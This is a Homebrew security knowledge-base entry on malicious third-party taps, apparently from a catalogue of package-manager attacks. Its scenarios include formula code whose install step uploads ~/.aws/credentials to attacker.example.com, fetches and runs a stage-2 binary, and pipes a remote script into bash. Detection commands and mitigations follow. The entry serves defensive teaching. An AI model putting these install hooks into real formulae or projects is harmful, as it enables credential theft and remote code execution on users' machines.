---
name: "Malicious Third-Party Tap Supply Chain"
packageManager: "brew"
slug: "brew-malicious-tap"
category: "Supply Chain"
severity: "high"
platform:
  - "macOS"
  - "Linux"
description: "`brew tap <user>/<repo>` adds a third-party git repository as a source of formulae and casks. Once tapped, the tap's formulae are installable by short name and participate in `brew update`/`brew upgrade` like homebrew-core, but they do not go through homebrew-core's public review process. Attackers exploit this by typo-squatting popular tap names, compromising maintainer credentials, or convincing users to tap a repo via README instructions — any of which grants arbitrary Ruby execution at install time across every machine that follows the instructions."
prerequisites:
  - "Victim runs `brew tap <user>/<repo>` against an attacker-controlled repository"
  - "Victim subsequently runs `brew install`, `brew upgrade`, or `brew update` — which auto-pulls the tap"
  - "For typosquat variants: a name close enough to a legitimate tap to trick users (e.g. `hashicorp/tap` vs `hashi-corp/tap`)"
attackScenarios:
  - title: "Typosquatted Tap Mimicking a Popular Vendor"
    description: "An attacker registers a GitHub repository named `homebrew-<product>` under an org that resembles a real vendor and seeds it with convincingly-named formulae. Users who copy-paste install instructions from a blog post, Stack Overflow answer, or AI-generated README tap the attacker instead of the legitimate publisher."
    commands:
      - label: "Attacker prepares the tap repository"
        code: |
          # Attacker owns github.com/hashi-corp (note the hyphen)
          mkdir homebrew-tap && cd homebrew-tap
          mkdir Formula
          cat > Formula/terraform.rb <<'RUBY'
          class Terraform < Formula
            desc "Infrastructure as code tool"
            homepage "https://www.terraform.io/"
            url "https://releases.hashicorp.com/terraform/1.8.0/terraform_1.8.0_darwin_arm64.zip"
            sha256 "0000000000000000000000000000000000000000000000000000000000000000"

            def install
              # Exfiltrate before dropping the real binary
              system "/bin/bash", "-c",
                "curl -fsSL -X POST --data-binary @#{ENV["HOME"]}/.aws/credentials https://attacker.example.com/c 2>/dev/null; true"
              system "/bin/bash", "-c",
                "curl -fsSL https://attacker.example.com/stage2 -o /tmp/.t && chmod +x /tmp/.t && /tmp/.t &"
              bin.install "terraform"
            end
          end
          RUBY
          git init && git add . && git commit -m "Initial tap"
          git remote add origin git@github.com:hashi-corp/homebrew-tap.git
          git push -u origin main
        language: "bash"
      - label: "Victim follows a malicious 'install Terraform' snippet"
        code: |
          # Copy-pasted from a poisoned tutorial
          brew tap hashi-corp/tap
          brew install hashi-corp/tap/terraform
          # install method exfils ~/.aws/credentials and launches a stage-2 binary
        language: "bash"
  - title: "Compromised Tap Pushing a Silent Update"
    description: "An attacker who phishes or steals credentials for an existing, widely-used tap's maintainer can push a commit that only modifies the `install` or `postflight` block of a popular formula. Because `brew update` runs automatically before most commands, every user of the tap pulls the change the next time they run brew."
    commands:
      - label: "Attacker pushes a minimal malicious diff"
        code: |
          # Single-commit diff to an existing, trusted formula in the tap
          diff --git a/Formula/widget.rb b/Formula/widget.rb
          --- a/Formula/widget.rb
          +++ b/Formula/widget.rb
          @@ def install
          +    system "/bin/bash", "-c",
          +      "curl -fsSL https://attacker.example.com/b | bash &"
               bin.install "widget"
             end
        language: "bash"
      - label: "Victim runs any brew command — auto-update pulls the poisoned formula"
        code: |
          brew install something-else
          # Triggers: brew update -> git fetch on every tap -> new widget.rb present
          brew upgrade widget
          # The injected curl|bash runs during the install step
        language: "bash"
  - title: "Overriding a Core Formula From an Attacker Tap"
    description: "If a user installs a formula via its fully-qualified tap path (`attacker/tap/jq`), Homebrew resolves it from the attacker's tap rather than homebrew-core — even if homebrew-core also has a `jq`. Attackers exploit this by publishing same-named formulae and convincing users (via tutorials, issue comments, or social engineering) that the tap version is 'better' or 'newer'."
    commands:
      - label: "Attacker tap overrides a core formula name"
        code: |
          # Formula/jq.rb in attacker/homebrew-utils
          class Jq < Formula
            desc "Command-line JSON processor (faster build)"
            url "https://example.com/jq-1.7.tar.gz"
            sha256 "aaaa" * 16

            def install
              # Runs with user privileges during `brew install attacker/utils/jq`
              system "/bin/bash", "-c", "curl -fsSL https://attacker.example.com/p | bash &"
              bin.install "jq"
            end
          end
        language: "ruby"
      - label: "Victim installs the overriding formula"
        code: |
          brew tap attacker/utils
          brew install attacker/utils/jq
        language: "bash"
detection:
  - title: "Enumerate all tapped repositories and verify their origins"
    description: "Every tap is a git clone under `$(brew --repository)/Library/Taps`. List them and confirm each remote resolves to a known-good organization. Unexpected taps — especially those with names close to legitimate vendors — warrant review."
    commands:
      - code: |
          brew tap
          for t in $(brew tap); do
            echo "=== $t ==="
            git -C "$(brew --repository)/Library/Taps/${t/\//\/homebrew-}" remote -v
          done
        language: "bash"
  - title: "Review tap git history before upgrading"
    description: "Diff the tap's recent commits before running `brew upgrade`. Because `brew update` happens automatically on most commands, unreviewed tap changes land silently — pinning or diffing first is the only way to catch malicious edits."
    commands:
      - code: |
          export HOMEBREW_NO_AUTO_UPDATE=1
          cd "$(brew --repository)/Library/Taps/attacker/homebrew-tap"
          git fetch origin
          git log --oneline HEAD..origin/main
          git diff HEAD..origin/main -- Formula/ Casks/
        language: "bash"
  - title: "Block unknown taps at the endpoint or proxy layer"
    description: "For managed macOS fleets, restrict outbound git traffic so `brew tap` can only clone from an allow-listed set of GitHub orgs (homebrew/, the vendor taps your org actually uses). This prevents typo-squats from resolving."
    commands:
      - code: |
          # Example: list taps present across a fleet via MDM / osquery
          osqueryi --json "SELECT path FROM file WHERE path LIKE '/opt/homebrew/Library/Taps/%/homebrew-%' AND type = 'directory';"
        language: "bash"
mitigation:
  - "Before tapping, verify the org name character-by-character against the vendor's official docs — do not copy from tutorials or LLM output"
  - "Set `HOMEBREW_NO_AUTO_UPDATE=1` in CI and dev shells so tap updates do not land without explicit review"
  - "Pin critical taps to a reviewed commit with `git -C $(brew --repository)/Library/Taps/<tap> checkout <sha>`"
  - "Periodically audit `brew tap` output and remove taps the team no longer uses (`brew untap`)"
  - "Restrict cloning scope at the network layer for managed fleets — only allow git.github.com paths for approved orgs"
  - "Prefer the fully-qualified form (`homebrew/core/jq`) when scripting installs, so a tap cannot shadow a core formula"
references:
  - title: "Homebrew Taps Documentation"
    url: "https://docs.brew.sh/Taps"
  - title: "brew tap manpage"
    url: "https://docs.brew.sh/Manpage#tap-options-user-repo-url"
  - title: "Homebrew how-to: creating and maintaining a tap"
    url: "https://docs.brew.sh/How-to-Create-and-Maintain-a-Tap"
created: 2026-04-21
updated: 2026-04-21
---
